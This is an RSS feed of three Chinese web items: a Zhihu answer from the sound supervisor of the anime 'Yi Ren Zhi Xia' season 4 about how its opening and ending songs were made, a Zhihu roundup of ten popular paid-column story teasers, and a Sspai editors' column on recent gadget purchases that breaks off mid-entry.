[{"title":"如何评价《一人之下》第四季的片头曲和片尾曲？","date":"2021-10-01 01:19:02","description":"\n<p>知乎的朋友们好！我是《一人之下4》和《一人之下3》的音乐和音响监制潇娘，最近一人4上线了2集看到了很多朋友对音乐的讨论，在这里想分享下一人4音乐的创作过程。</p>\n<p><br></p>\n<p>一、片头曲《无念无生》写的是临时工群像。</p>\n<p><br></p>\n<p>《无念无生》开头采用了《一人之下》动画一贯且独有的特色开头——贵州粗犷悠远的山歌唱腔，中间歌曲主题采用了特立独行的djent金属，而结尾短短两句山歌则是对第二季四川民歌的call back，表示剧情经过第三季的插入式剧情段落后又回到了主线，同时也是对同样导了第二季的陈烨导演的回归而致敬。</p>\n<p>歌曲以既具爆发力又笼罩着压抑深沉情绪的嗓音和不断奔涌前进式的金属风格体现了《一人之下》中“临时工”这个特殊的群像——肖哥，黑管，球儿他们几个人虽然性格各异难以概述，但他们是确确实实的一批幕后英雄，饱含一腔热血，但所做所为却不可为人知。因此这首曲子处理成了较为深沉压抑、绝不回头的冷峻气质。</p>\n<p><br></p>\n<p>二、片尾曲《碧游欢迎你》是写如花的歌，也是第四季碧游村篇章的一则印象小品。</p>\n<p><br></p>\n<p>《碧游欢迎你》是一首少见的融合了多钟西南少数民族音乐元素的trap风格歌曲。歌曲开头初始分别引入了川剧和京剧唱腔，然后逐渐被浮出水面的的侗族大歌女领唱的声音取代——这个富有深意的处理动机意为动画前三季的四川民歌元素、京味音乐元素即刻被第四季的贵州少数民族音乐元素所取代，也意味着第四季主线剧情王者归来。进入主歌前的邪魅一笑“哈哈哈~”预示着可能你所听到的歌曲并非你在歌词所见的那样……</p>\n<p>歌曲主歌部分为诡魅又阴沉的女声，而后我们实录的侗族大歌的人声合唱元素也被处理成一唱一和的形式作为背景人声融合在了歌曲的后方，这些有趣的人声搭配上trap的强烈鼓点，仿佛就是神秘的碧游村正在忽悠主角们前来了，还挺霸道难缠，带着点勺子杀人狂的韧性感……。在进副歌之前则加入了一小段侗族乐器“牛腿琴”循环往复的粗糙拉奏，原始而洗脑。歌曲的副歌以高亢并带有侵略性的贵州话山歌能让人打起激灵~ 歌词却是机械化而略带年代感的迎宾语，吹嘘村长的废话马屁 —— 总之一切显得似乎过于热情了，不禁让人想知道进来这个村子会发生什么有趣（或不幸）的事情呢哈哈哈，作词超坏的。</p>\n<p>值得一提的是，该首歌曲基本复刻了第三季的特别片尾曲《王道长可能会摔手机》的段落构成方式，这个点细心的朋友可以从副歌的最后一段重复段落里色彩丰富的爵士和声中可以感受到作曲的设计。《王道长可能会摔手机》和《碧游欢迎你》一个是以碧游村的村长“马仙洪”的感情充沛吸引主角前来，一个是以马村长的人形狗腿“如花”们的热情迎接吸引主角们前来。《一人之下4》的片尾曲继《幺妹儿冯宝宝》《心猿归正》的好评后一如既往、喜闻乐见地处理得比较有趣和深度民俗化。</p>\n<p><br></p>\n<p>三、关于片头片尾曲的考虑</p>\n<p><br></p>\n<p>诚然，第四季的故事背景是在西南贵州一片。片尾歌曲中出现的的侗族大歌、牛腿琴等音乐元素是我们在2020年秋天去贵州东南宰荡村侗寨进行的实录取材。当时的音乐采风之旅录了长达十几个小时时长的音视频素材，包括了大量的西南少数民族音乐，比如苗族的芦笙，也get了一些有趣的知识：侗寨多在山下依水而居，苗寨多在山顶因险而建，同一片山头能扎着几个不同民族的寨子，大家往来颇多。当时也是取材完了山沟里侗寨的大歌后侗族村长朋友指引我上了旁边的山头去听苗族的芦笙歌舞。少数民族之间的文化交流和走动尚且如此开放，我们在ED制作上除了一贯的趣味性，也更应该去拥抱去尝试更多融合性和开放性的想法进来。关于片尾曲为何如此“上头”，可能确实和我们花了很多时间去思考融合性有关系吧~</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5fc8f7bfaf2c9decbaa58235f6a19097_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>（图为牛腿琴乐手和休息中的侗族姐姐，寨子里的年轻人已经越来越少了）</p>\n<p>相对应的，片头曲的方向我们在设计初期也是按照惯例去写了山歌，也确实做出来了几个还很不错的版本。但随着动画制作的推进，我越发认为这首歌作为全季的OP应该更有概括性和统一性，过多的元素我担心会和本季聚焦的临时工剧情、本次导演的画面表演相撞，所以这次没有往一味追求燃的方向走，除了开头结尾外也没有过多融合民歌元素，而是在歌曲主题阶段选择了单一不花哨的金属风格，贴合了临时工群体纯粹、不回头的感觉。而之前为OP所准备的一些少数民族音乐取材元素，通通留给了ED和bgm。</p>\n<p>OP信息传达的任务会比ED重。这一季剧情确实也一直挺压抑的，因此副歌没有过分的做拔高本身也是为了契合临时工这种“幕后战士”的感觉。再一个小考虑是希望这次的旋律能简单上口一些，之前第三季片头曲《出入平安》虽然人气也不错，但因为中间有一段rap导致翻唱率不太高。多重考虑之下，且本季切入点是临时工群像的话，纯粹的山歌确实就有点窄了。本季的音乐是一个整体，我们后面还有多首歌曲，风格和元素都不一样，这个大家放心，请继续期待！（写这段文字的时候还在死磕第三集第四集的最终音响效果……）</p>\n<p>最后，OP《无念无生》、ED《碧游欢迎你》这次我们都制作了杜比全景声版本，不日上线apple music、腾讯视频、B站等平台。这次我们也会发行海外多个音视频平台，尽量让世界各地的动画粉丝朋友都可以loop起来一人之下的歌曲魅力。</p>\n<p><br></p>\n<p>真诚感谢近期大家对两首歌曲的喜欢和批评！</p>\n<p><br></p>\n<p><br></p>\n<p>四、安利</p>\n<p><br></p>\n<p>除了即将陆续登场的多首歌曲外，本次配乐仍然是很大亮点，极其注重氛围感和情绪营造，也有不少民族音乐元素的融入。我们和作曲、音频团队昼夜不舍的打磨都是希望能尽量带给大家电影级的体验。</p>\n<p>另外陈朵角色歌《夜之花》发布啦！这首大气和细腻并存，陈朵的剧情会覆盖较长一段时间，而随着动画剧情的发展可以慢慢去反复感受到词曲的优秀。和阿朵老师的合作是真是十分玄妙的过程，录音当天朵姐为了进入角色，甚至花了很长一段时间静心去和歌曲中一股特殊的“炁”对抗，我们当天都完全被朵姐的唱腔和气质感染到。还没关注到的朋友去QQ音乐酷狗酷我5sing收听吧~ MV也敬请期待！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lubyson-liang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">潇娘</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489030529/answer/2148958668?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">4 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/390827218?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《一人之下》第三季 的片头曲《出入平安》和片尾曲《心猿归正》？</a><br><a href=\"http://www.zhihu.com/question/419222424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有哪些好听的各类主题曲，片头曲，片尾曲，插曲？</a><br>\n","link":"http://www.zhihu.com/question/489030529/answer/2148958668?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"令人心动的 10 个盐选故事（八月存档）","date":"2021-09-30 09:45:57","description":"\n<p>又是一年开学季！大朋友小朋友们在暑假有读到好看的故事吗？在等待秋天到来的日子里，知友们最喜爱的十个专栏故事也新鲜出炉啦～</p>\n<p>这个月里，有能让人回忆起大学兄弟和青春的科幻故事，也有读到冷汗直流的推理故事，有正中泪点的言情故事，更有斩不断理还乱的现实情感～</p>\n<p>一起跟随本奇奇的步伐探寻 ta 们的故事吧～</p>\n<hr>\n<p>问题：<a href=\"https://www.zhihu.com/question/265793577/answer/2069100935\" class=\"internal\">为什么身边的朋友慢慢地都不打游戏了？</a></p>\n<p>作者 <a href=\"https://www.zhihu.com/people/zhang-yi-96-60-64\" class=\"internal\">@张冉</a></p>\n<p>大学里，舍友一拳打碎显示器切断自己手指这事儿成了传奇，人人都知道 213 寝室有位精神不太正常的星际高手……<a href=\"https://www.zhihu.com/question/265793577/answer/2069100935\" class=\"internal\">&gt;&gt;&gt;</a></p>\n<blockquote>知友点评：看了开头只觉得文笔很稳，看到最后发现那只是锦上添花，盐选会员表示感动极了</blockquote>\n<p>本文已收录盐选专栏：</p>\n<a href=\"https://www.zhihu.com/market/paid_column/1405842162601275392/section/1405847317031788544\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-182bd1f1d70e30bda1ded43adcf7f38a_180x120.jpg\" data-image-width=\"750\" data-image-height=\"422\" class=\"internal\">知乎盐选 | 再见，老七</a><hr>\n<p>问题：<a href=\"https://www.zhihu.com/question/65247333/answer/2050654093\" class=\"internal\">警察在讯问嫌疑人时遇到过哪些神回复？</a></p>\n<p>作者 <a href=\"https://www.zhihu.com/people/ye-mian-yi-chang\" class=\"internal\">@页面异常</a></p>\n<p>12 年前，我还在刑警队的时候，见证过一场「神级审讯」。而审讯人，是一个刚入队不久的警校实习生。</p>\n<p>那件事之后，我一直无比庆幸一点——他是警察。<a href=\"https://www.zhihu.com/question/65247333/answer/2050654093\" class=\"internal\">&gt;&gt;&gt;</a></p>\n<blockquote>知友点评：作者利用精彩的推理故事操纵了我</blockquote>\n<p>本文已收录盐选专栏：</p>\n<a href=\"https://www.zhihu.com/market/paid_column/1341721656356773888/section/1403733567973838848\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-b6f94d27c01692f26b485a75ce91de5b_180x120.jpg\" data-image-width=\"750\" data-image-height=\"422\" class=\"internal\">知乎盐选 | 天生犯罪者</a><hr>\n<p>问题：<a href=\"https://www.zhihu.com/question/352335209/answer/2031251950\" class=\"internal\">你身边有比较虐心的爱情故事吗?</a></p>\n<p>作者 <a href=\"https://www.zhihu.com/people/zhi-zhi-wei-zhi-zhi-64-32-37\" class=\"internal\">@枝枝为只只</a></p>\n<p>我妈打电话来的时候，我正在帮陆河收拾卧室。</p>\n<p>自从上个月，陆河把家里的备用钥匙放到了我手里。这段时间，我几乎每天都会过来。<a href=\"https://www.zhihu.com/question/352335209/answer/2031251950\" class=\"internal\">&gt;&gt;&gt;</a></p>\n<blockquote>知友点评：凭我征战言情十几载的生涯，我敢断定男主绝对是小舅舅</blockquote>\n<p>本文已收录盐选专栏：</p>\n<a href=\"https://www.zhihu.com/market/paid_column/1409146173547081728/section/1409294859576053760\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-68365a2ebdfccd951a3a9d0d93835eac_180x120.jpg\" data-image-width=\"750\" data-image-height=\"422\" class=\"internal\">知乎盐选 | 暧昧失温</a><hr>\n<p>问题：<a href=\"https://www.zhihu.com/question/443793653/answer/1978052612\" class=\"internal\">如何以「太子与太子妃十分恩爱，但我是太子的侧妃」写篇文章？</a></p>\n<p>作者 <a href=\"https://www.zhihu.com/people/nan-fang-gu-niang-zheng-zhu-cha\" class=\"internal\">@许久望川</a></p>\n<p>太子与太子妃十分恩爱</p>\n<p>但我是太子侧妃。</p>\n<p>笑死，我嫁进来太子府三年，就吃了三年他们的狗粮。</p>\n<p>太子和太子妃赏月，我就在旁边吃月饼，只给他们剩了五仁馅的。<a href=\"https://www.zhihu.com/question/443793653/answer/1978052612\" class=\"internal\">&gt;&gt;&gt;</a></p>\n<blockquote>知友点评：作者乃德云社旗下德雨社的高徒吧</blockquote>\n<p>本文已收录盐选专栏：</p>\n<a href=\"https://www.zhihu.com/market/paid_column/1304118177735929856/section/1405980821552041984\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-8aabf184ab00413aa6a802575665e32e_180x120.jpg\" data-image-width=\"750\" data-image-height=\"422\" class=\"internal\">知乎盐选 | 良娣她独得恩宠</a><hr>\n<p>问题：<a href=\"https://www.zhihu.com/question/428436945/answer/2040602762\" class=\"internal\">怀孕时让你最崩溃的瞬间是什么?</a></p>\n<p>作者 <a href=\"https://www.zhihu.com/people/hcyx\" class=\"internal\">@睡莲开的那一天</a></p>\n<p>怀孕六个月的时候，我无意中在网上看到了我老公发的帖子。他问网友：有没有能让大月龄孕妇自然流了的办法？</p>\n<p>我万万没有想到，体贴细心的二十四孝好老公，竟然是一头披着羊皮的狼。<a href=\"https://www.zhihu.com/question/428436945/answer/2040602762\" class=\"internal\">&gt;&gt;&gt;</a></p>\n<blockquote>知友点评：好感动，够爽剧情不拖拉</blockquote>\n<p>本文已收录盐选专栏：</p>\n<a href=\"https://www.zhihu.com/market/paid_column/1378668158824411136/section/1406277749774823424\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-cc4f29a27fb9afa3e36defd10bf9d6aa_180x120.jpg\" data-image-width=\"750\" data-image-height=\"422\" class=\"internal\">知乎盐选 | 孕妇凶猛</a><hr>\n<p>问题：<a href=\"https://www.zhihu.com/question/454060112/answer/2051685233\" class=\"internal\">你的暗恋最终是怎样收场的?</a></p>\n<p>作者 <a href=\"https://www.zhihu.com/people/xian-nu-mei-you-meng\" class=\"internal\">@张若妤</a></p>\n<p>我暗恋他两年，偷拍了一段他打篮球的视频，发去某短视频平台后意外爆火了。 </p>\n<p>就这样，几百万网友都知道了我喜欢他这件事。</p>\n<p>最重要的是，视频爆火后，他忽然加了我的微信。<a href=\"https://www.zhihu.com/question/454060112/answer/2051685233\" class=\"internal\">&gt;&gt;&gt;</a></p>\n<blockquote>知友点评：甜得我在床上扭</blockquote>\n<p>本文已收录盐选专栏：</p>\n<a href=\"https://www.zhihu.com/market/paid_column/1378681801355997185/section/1408430833254043648\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-6338df366e12d71583c73ea03993504e_180x120.jpg\" data-image-width=\"750\" data-image-height=\"422\" class=\"internal\">知乎盐选 | 系草请留步</a><hr>\n<p>问题：<a href=\"https://www.zhihu.com/question/459414381/answer/2036724224\" class=\"internal\">你和异性经历过哪些暧昧上头的瞬间？</a></p>\n<p>作者 <a href=\"https://www.zhihu.com/people/mo-lu-xiao-95\" class=\"internal\">@墨绿枭</a></p>\n<p>我送外卖时，撞倒了一个小富婆，她手上价值三十多万的玉镯子也摔碎了，要我赔。 </p>\n<p>我慌极了，但我打死都没想到，后来，我陪她喝酒，送她回别墅，她借着酒劲儿，竟低声跟我说：「扶我回卧室。」<a href=\"https://www.zhihu.com/question/459414381/answer/2036724224\" class=\"internal\">&gt;&gt;&gt;</a></p>\n<blockquote>知友点评：三句话，让富婆给我免掉二十四万</blockquote>\n<p>本文已收录盐选专栏：</p>\n<a href=\"https://www.zhihu.com/market/paid_column/1405522890737926144/section/1405891323417657345\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-ad9adc74746dcb06fa947bd4cdc887bc_180x120.jpg\" data-image-width=\"750\" data-image-height=\"422\" class=\"internal\">知乎盐选 | 手镯记</a><hr>\n<p>问题：<a href=\"https://www.zhihu.com/question/342094019/answer/2026806785\" class=\"internal\">有没有好看的「虐妻一时爽，追妻火葬场」的小说？</a></p>\n<p>作者 <a href=\"https://www.zhihu.com/people/a-a-a-a-bu-zhi-dao\" class=\"internal\">@闲得无聊的仙女​</a></p>\n<p>我暗恋十年的男神失恋了。</p>\n<p>他约我出去借酒消愁，我没想到他是借我消愁。<a href=\"https://www.zhihu.com/question/342094019/answer/2026806785\" class=\"internal\">&gt;&gt;&gt;</a></p>\n<blockquote>知友点评：女主前期卑微没有关系，希望后面男主的火葬场狠一点就好！加油作者大大，写的真棒！</blockquote>\n<p>本文已收录盐选专栏：</p>\n<a href=\"https://www.zhihu.com/market/paid_column/1357359836833976320/section/1408145173260472320\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-efdf901948b7eb93f7a9307de9640927_180x120.jpg\" data-image-width=\"750\" data-image-height=\"422\" class=\"internal\">知乎盐选 | 天黑前抱兔</a><hr>\n<p>问题：<a href=\"https://www.zhihu.com/question/364191258/answer/1933255391\" class=\"internal\">有没有女主比较理智的小说？</a></p>\n<p>作者<a href=\"https://www.zhihu.com/people/fei-chai-ri-chang-tan\" class=\"internal\"> @一川烟草</a></p>\n<p>他红着眼说：「你给我服个软，秋荷，你不是最想要权力吗？我给你，皇后之位给你，什么你想要的都给你，好不好？你再叫我一声太子哥哥，好不好？」<a href=\"https://www.zhihu.com/question/364191258/answer/1933255391\" class=\"internal\">&gt;&gt;&gt;</a></p>\n<blockquote>知友点评：」罢了 他给的实在太多了」呜呜呜看到最后想哭看到这句又想笑 呜呜呜太好看了</blockquote>\n<p>本文已收录盐选专栏：</p>\n<a href=\"https://www.zhihu.com/market/paid_column/1320739204394348544/section/1405908919663955968\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-c3091ccb1ed3669793537cac12ca058a_180x120.jpg\" data-image-width=\"750\" data-image-height=\"422\" class=\"internal\">知乎盐选 | 地上霜</a><hr>\n<p>问题：<a href=\"https://www.zhihu.com/question/65383028/answer/2022768786\" class=\"internal\">家里面有哪个亲戚令你感到恶心？</a></p>\n<p>作者 <a href=\"https://www.zhihu.com/people/liang-ze-yuan\" class=\"internal\">@魔女恰恰饭</a></p>\n<p>小叔子要结婚，婆婆跪在地上，求我把房子给她儿子作婚房，甚至还想除掉我？</p>\n<p>那天我才知道，原来不要脸，居然可以到了如此地步。<a href=\"https://www.zhihu.com/question/65383028/answer/2022768786\" class=\"internal\">&gt;&gt;&gt;</a></p>\n<blockquote>知友点评：干得漂亮</blockquote>\n<p>本文已收录盐选专栏：</p>\n<a href=\"https://www.zhihu.com/market/paid_column/1312434318623281152/section/1393963408644079616\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-965868abb96c36c613847e8527a855e6_180x120.jpg\" data-image-width=\"750\" data-image-height=\"422\" class=\"internal\">知乎盐选 | 我的妈妈超爱骂人</a><hr>\n<p>清晨开始悄悄变凉的时节，你喜欢的作者上榜了吗？</p>\n<p>你还喜欢想看什么样的故事，想追哪些作者大大的文呢？</p>\n<p>欢迎在评论区留言↓↓</p>\n<p>以上故事已收录盐选专栏，最低 0.3 元/天开通会员，即可查看全场完整内容 <a href=\"https://www.zhihu.com/xen/market/vip-privileges?zh_nav_left=back&amp;zh_forcehybrid=1&amp;ab_signature=CgASIGRjNjdiNmRhMjQxYTdhM2E4ZjgzNjg1NGRhMWM2NTVmGhAIAhIGNi41OS4wGgQyNzQ0\" class=\"internal\">&gt;&gt;</a></p>\n<p>专栏热度越高，作者大大的收益越高，我们一起为好故事加油( • ̀ω ⁃᷄)✧</p>\n<p>历史月榜回顾：</p>\n<p>2021 年：</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/353743585\" class=\"internal\">一月最受读者欢迎的盐选专栏 TOP10</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/360776649\" class=\"internal\">二月最受读者欢迎的盐选专栏 TOP10</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/368554526\" class=\"internal\">三月最受读者欢迎的盐选专栏 TOP10</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/376658232\" class=\"internal\">四月最受读者欢迎的盐选专栏 TOP10</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/385419820\" class=\"internal\">五月最受读者欢迎的盐选专栏 TOP10</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/395545471\" class=\"internal\">六月最受读者欢迎的盐选专栏 TOP10</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/407347763\" class=\"internal\">七月最受读者欢迎的盐选专栏 TOP10</a></p>\n<p>2020 年：</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/326378489\" class=\"internal\">九、十月最受读者欢迎的盐选专栏 TOP20</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/342599379\" class=\"internal\">十一月最受读者欢迎的盐选专栏 TOP10</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/349475864\" class=\"internal\">十二月最受读者欢迎的盐选专栏 TOP10</a></p>\n<blockquote>欢迎参与回答更多故事类问题，只要写得好就有机会被盐选专栏收录，获得更多流量和收益。</blockquote>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/liu-kan-shan-98-70?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">盐选奇妙物语</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/415766384?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"新玩意 079｜少数派的编辑们最近买了啥？","date":"2021-09-30 09:20:18","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<hr>\n<h2>@张奕源 Nick：Xbox Series X 蓝色版手柄</h2>\n<ul>\n<li>入手渠道：淘宝自购</li>\n<li>参考价格：429 元</li>\n</ul>\n<p>前段时间，我一直嚷嚷着老手柄坏了，要换新手柄。后来又将就了几天，发现老手柄不仅摇杆每次都能搓掉皮，连按键都开始按不下去了，终于下定决心买了新的。</p>\n<p>我的上一个手柄是 Xbox One 手柄。我一直很喜欢微软硬体的人体工学设计，尽管我也用过 PS4 和 PS5 的手柄，但考虑到长期使用时的舒适度，以及与 Windows 系统的适配度，最终还是紧跟 Xbox 主机的进化脚步，买了 Xbox Series X 的手柄。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ana05b34teit0pmqi0.jpeg\"></figure><p>作为上一代 Xbox 手柄的使用者，我在初次摸到新款手柄之后觉得整体手感没有太大改变，最明显的区别在于肩键的位置和手感有了微调，而且每个按键的反馈力度都更为清脆明确。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ana0lb34teh5fkvdcg.jpeg\"></figure><p>实际游戏中我发现，Xbox Series X 的摇杆也比前代产品有了更高的精度和灵敏度，尤其在 <i>FIFA 21</i> 中进行精细操控和盘带时，手柄的方向控制能更明显地影响球员的行进方向和过人成功率。</p>\n<p>为了和之前的黑色有所区别，我这次买了个蓝色款。蓝色版的正面是深蓝色，背面则是全白。我在下单时犹豫了一下，担心白色不耐脏，何况手柄还是个用久了就很容易摸脏和打油的玩意儿。但到手之后用了一段时间，目前没有发现变脏的迹象。微软还在这代手柄的握柄区域都加上了能增加摩擦阻力的细纹，按理说应该更容易粘灰才对，实际也完全没有，有点神奇。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ana15b34teh3cl8lf0.jpeg\"></figure><p>有一点需要提及，这一代手柄赠送的连接线明显变短了，我把线插在电脑主机后端，另一段差不多刚好延伸到桌子上，而上一代的线长度可能有两米，允许我扯到远处的沙发上坐着玩。由于我的无线连接器被猫撞断了，目前只好采用有线的方式使用，所以无线模式的续航还没机会测试。如果之后我配了新的无线连接器，再来反馈续航情况吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ana1lb34teh5fkvdd0.jpeg\"></figure><p>总体来说，Xbox Series X 手柄（以及 Xbox 精英版手柄）就是 PC 上的最强游戏手柄了。四百多的价格说起来不便宜，但考虑到其手感舒适度以及其它同类产品水涨船高的价格，这款微软自家出品的手柄反倒很有性价比。希望这款手柄能像上一代一样坚挺，等下一代 Xbox 发布之后，我再买个新手柄测测看。</p>\n<h2>@Tp：AirPods Pro</h2>\n<ul>\n<li>入手渠道：京东自营</li>\n<li>参考价格：¥1499</li>\n</ul>\n<p>我也许是最后一个入手 AirPods Pro 的人。之前迟迟没入手的原因主要是手里的 AirPods 一代依然坚挺，而且自己也已经有了索尼的 WH-1000XM3，暂时没有对 AirPods Pro 的强需求。</p>\n<p>从去年年底开始，我的 AirPods 就已经处于几乎不可用的状态。左耳戴上后几秒便会没电断连，右耳的电池也坚持不过 1 个小时。于是我从年初开始就一直期待着 AirPods Pro 2 / AirPods 3 的出现。直到今年过去了 3/4，我还是没能如愿等到新品，恰逢<s>鸽王</s>周杰伦发了空间音频的 Live 专辑，入手 AirPods Pro 的想法又涌上心头。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ana25b34teh3cl8lfg.jpeg\"></figure><p>于是，在京东折扣和朋友们的热情安利下，我还是没忍住入手了 AirPods Pro。单从佩戴舒适度上来说，AirPods Pro 算得上是我用过的所有入耳式耳机中最优秀的了。上手之后最让我惊艳的倒不是佩戴体验<s>（毕竟我之前就戴过女朋友的 AirPods Pro）</s>，而是空间音频和 iOS 15 全新的「空间化立体声」。</p>\n<p>初听空间音频其实感觉一般，并没有想象中那么震撼。但当我多听了几首歌以后，确实能感觉到空间音频对音乐体验的提升。配合上 AirPods Pro 的降噪，给我带来了一种非常沉浸的音乐体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ana2db34teh0gc1do0.gif\"></figure><p>总的来说，在这个时间节点买 AirPods Pro 多少有点「49 年入国军」的感觉<s>（我恰好还是在 9 月 30 号收到的快递 🌝）</s>。不过在旧耳机老矣，新品遥遥无期的情况下，入手这台 AirPods Pro 我倒也并不觉得亏。</p>\n<h2>@北鸮：Ganss HS87T 干电池三模机械键盘</h2>\n<ul>\n<li>入手渠道：天猫旗舰店</li>\n<li>参考价格：699 元</li>\n</ul>\n<p><s>（是的，我又买键盘了。）</s></p>\n<p>我对无线键盘有一种奇怪的执念：如果不能使用干电池，那它注定无法成为我的主力。这也是我还留着轴体烂到家的罗技 G613 的唯一原因。</p>\n<p>其实用锂电池本身没什么问题，毕竟按照我的键盘数量和更换频次来看，我很难凭一己之力把内置的锂电池干到需要更换。蓝牙和 2.4G 这样的无线协议本身也没那么费电，耗电的是灯光：RGB 关上，续航两个月，RGB 打开，续航两整天。倒不是说我有多热衷于在自己桌面上摆上一把跑马灯，只是干电池供电的键盘从没电到满电只用十秒钟换换电池，这种连贯的无线体验和有线一样稳定又舒爽。而我的选择也变得很少：我想要干电池供电，想要热插拔换轴，如果可以，最好还能带上灯光——我可以不用，但你最好有。自从因为受不了 Mickeyboard 的老 Minila 配列选择出手后，我就一直没碰上支持轴体热插拔的干电池套件。</p>\n<p>GANSS 几年前很有名，它和 IKBC 一样，是国产性价比 Cherry 轴键盘的代表。其实他家的 Cherry 轴无线键盘很早就用了干电池供电，而且连接稳定性做得很好。唯一的问题就是他们真的只做焊接 Cherry 轴：这搁以前是个优点，放在国产优质轴体百花齐放的现在，已经成了麻烦。不过最近他们终于顺应了潮流，推出了 Hello Ganss 系列键盘，热插拔、国产轴、干电池、三模连接、RGB 全都上了。等到 87 键版本上市之后，我立马搞了一把。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ana2tb34teh0gc1dog.jpeg\"></figure><p>首发的颜色分别是马卡龙粉、绿、蓝。粉色的实际调色很柔和，未来配键帽应该也比较容易。蓝牙模式能记忆五个蓝牙设备，再加上有线和 2.4G，一把键盘把我手头所有设备都连上还有富余。这次我选了 TTC 金粉聚光镜轴，触发压力只有 37 g，手感比其他低压力轴体更脆，轻巧但不粘滞。金粉轴算是目前国产轴体中的佼佼者，表现一直很稳定，Ganss 首发的聚光镜版本本质上没什么差别，只是添加了全新设计的透镜，让灯光表现更好了一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ana35b34teh3cl8lg0.jpeg\"></figure><p>——是的，这是我一把带了 RGB 背光的干电池键盘，虽然这两者在实质上还是不兼容的：灯光只在有线模式下开启，无线连接时无灯光，两节五号电池续航约两个月，但有就胜过没有。干电池肯定带不动灯，可能这个 RGB 灯光的意义就是让使用者感受一下聚光镜，实在想看了插线即可得吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ana3db34teh0gc1dp0.gif\"></figure><p>回到键盘本身，Ganss 还是老样子，没跟着其他厂子把夹心棉底棉这些玩意儿塞满，显得有点落伍，但实际上手影响不大。金粉轴本身就是脆的，声音更亮一点我也没什么意见。手感上，整把键盘左侧 Shift 有些杂音，卫星轴精度可以再加强，其他都还算稳，也不会影响使用。但买无轴无键帽的套件就显得有点不值当了，不如直接买带金粉/快银轴的成品键盘。想换轴，自己折腾折腾就行。对于想要干电池键盘的人来说，HS 系列已经是最好的选择了。</p>\n<h2>@老麦：蓝宝石屏幕保护膜</h2>\n<p>去年的 iPhone 12 